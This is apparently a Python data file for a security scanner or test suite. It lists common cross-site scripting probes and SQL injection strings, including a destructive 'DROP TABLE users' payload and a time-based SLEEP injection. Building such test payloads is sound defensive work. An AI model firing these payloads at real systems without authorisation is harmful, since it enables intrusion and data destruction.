XSS_PAYLOADS = [
    '<script>alert("xss123")</script>',
    '<svg/onload=alert("xss123")>',
    '" onfocus="alert(\'xss123\')"',
    "'><script>alert('xss123')</script>",
    "<img src=x onerror=alert('xss123')>",
]

SQLI_PAYLOADS = [
    "' OR 1=1 --",
    "' OR 'a'='a' --",
    "'; DROP TABLE users; --",
    "' UNION SELECT NULL, NULL --",
    "\" OR 1=1 --",
    "' OR SLEEP(5) --",
]
